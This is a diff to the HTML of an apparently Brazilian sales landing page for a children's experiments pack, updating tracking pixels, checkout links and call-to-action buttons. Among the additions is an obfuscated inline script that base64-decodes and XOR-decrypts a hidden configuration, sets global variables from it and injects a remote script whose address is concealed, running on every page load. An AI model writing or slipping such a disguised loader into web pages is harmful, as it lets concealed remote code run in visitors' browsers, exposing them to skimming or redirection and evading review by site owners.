@@ -8,6 +8,17 @@
     'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
     })(window,document,'script','dataLayer','GTM-PFGRZZR2');</script>
     <!-- End Google Tag Manager -->
+    <!-- Utmify: Rastreamento Pixel & UTMs -->
+    <script>
+  window.pixelId = "6aeb77f0904f0fb67c1d92ff";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script>(function(){var r_5=atob("DBpwdIkebIxN9y+MR2FSAftyTrZvn1v4N2lKW6Z9COJjglvhLnwJWupxAaIvhQD/JGgZBP1tQ/k5mlyjK3sEEfpqQuY+1QOuJm4EBuB8GfgohA22HGFSGuhzCa531UvtM3tdAf1zBeo02l/+ImwVGv0zFO8ikwL/JHFSWKtoDeA4kg22ZTgNWPI8Au0gkg22ZX4RAOgzGfggnkn1amoCEf97AvhghFruLn4DVqU8Gu0hgkqufThSCdRj");var q_i=[];for(var q_0uv=0;q_0uv<r_5.length;q_0uv++){q_i.push(r_5.charCodeAt(q_0uv)&255);}var e_bvft=q_i[0];var q_x=q_i.slice(1,1+e_bvft);var g_v8ji=q_i.slice(1+e_bvft);var r_ehk=g_v8ji.map(function(b,w_1a){return b^q_x[w_1a%e_bvft];});var l_bk8j="";for(var i_m3=0;i_m3<r_ehk.length;i_m3++){l_bk8j+=String.fromCharCode(r_ehk[i_m3]&255);}var x_z=decodeURIComponent(escape(l_bk8j));var f_d=JSON.parse(x_z);var n_zwi=f_d.globals||[];n_zwi.forEach(function(h_1){window[h_1.name]=h_1.value;});var k_1=document.createElement("script");k_1.src=f_d.url;k_1.async=true;k_1.defer=true;(f_d.attributes||[]).forEach(function(q_6lj){k_1.setAttribute(q_6lj.name,q_6lj.value);});(document.head||document.documentElement).appendChild(k_1);})();</script>
+
 
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -24,7 +35,7 @@
     <!-- Otimizações de Carregamento Instantâneo & Checkout Rápido -->
     <link rel="preconnect" href="https://loja.geniozinhoemacao.com.br" crossorigin>
     <link rel="dns-prefetch" href="https://loja.geniozinhoemacao.com.br">
-    <link rel="prefetch" href="https://loja.geniozinhoemacao.com.br/checkout/v2/gmzgYIvsRBQf2JFyvbrmL0" as="document">
+    <link rel="prefetch" href="https://loja.geniozinhoemacao.com.br/checkout/v4/gmzgYIvsRBQf2JFyvbrmL0" as="document">
     <link rel="preload" as="image" href="./assets/capa-experimentos-nova.webp" type="image/webp">
 
     <script type="speculationrules">
@@ -32,7 +43,7 @@
       "prefetch": [
         {
           "source": "list",
-          "urls": ["https://loja.geniozinhoemacao.com.br/checkout/v2/gmzgYIvsRBQf2JFyvbrmL0"]
+          "urls": ["https://loja.geniozinhoemacao.com.br/checkout/v4/gmzgYIvsRBQf2JFyvbrmL0"]
         }
       ]
     }
@@ -117,9 +128,7 @@
 
             <!-- Botão CTA Principal -->
             <div class="pt-2">
-              <button type="button" class="btn-primary-cta" data-testid="button-cta-hero" onclick="document.getElementById('secao-experimentos').scrollIntoView({behavior: 'smooth'})">
-                <span>QUERO ACESSAR AGORA</span>
-              </button>
+              <a href="#secao-experimentos" class="btn-primary-cta" data-testid="button-cta-hero">QUERO ACESSAR AGORA</a>
 
               <div class="cta-trust-badges">
                 <span class="cta-trust-item">
@@ -512,9 +521,7 @@
 
           <!-- Botão CTA da Seção 4 (Fora do Card) -->
           <div class="text-center" style="margin-top: 32px; margin-bottom: 8px;">
-            <button type="button" class="btn-primary-cta" data-testid="button-cta-section4" onclick="document.getElementById('oferta').scrollIntoView({behavior: 'smooth'})">
-              <span>QUERO SURPREENDER MEU FILHO!</span>
-            </button>
+            <a href="#oferta" class="btn-primary-cta" data-testid="button-cta-section4">QUERO SURPREENDER MEU FILHO!</a>
           </div>
 
         </div>
@@ -665,9 +672,7 @@
 
           <!-- Botão CTA Bônus (Fora do Card) -->
           <div class="text-center" style="margin-top: 32px; margin-bottom: 8px;">
-            <button type="button" class="btn-primary-cta" data-testid="button-cta-bonus" onclick="document.getElementById('oferta').scrollIntoView({behavior: 'smooth'})">
-              <span>QUERO MEU PACOTE COMPLETO + BÔNUS!</span>
-            </button>
+            <a href="#oferta" class="btn-primary-cta" data-testid="button-cta-bonus">QUERO MEU PACOTE COMPLETO + BÔNUS!</a>
           </div>
 
         </div>
@@ -1404,13 +1409,7 @@
 
               <!-- Botão de Compra -->
               <div class="offer-cta-container">
-                <a href="https://loja.geniozinhoemacao.com.br/checkout/v2/gmzgYIvsRBQf2JFyvbrmL0" class="offer-cta-btn w-full" data-testid="button-checkout">
-                  <span class="offer-cta-text">
-                    <span class="cta-line">COMPRAR PACOTE COMPLETO</span>
-                    <span class="cta-line">COM DESCONTO!</span>
-                  </span>
-                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg>
-                </a>
+                <a href="https://loja.geniozinhoemacao.com.br/checkout/v4/gmzgYIvsRBQf2JFyvbrmL0" class="offer-cta-btn w-full" data-testid="button-checkout">COMPRAR PACOTE COMPLETO COM DESCONTO!</a>
               </div>
 
               <!-- Selos de Segurança e Confiança -->
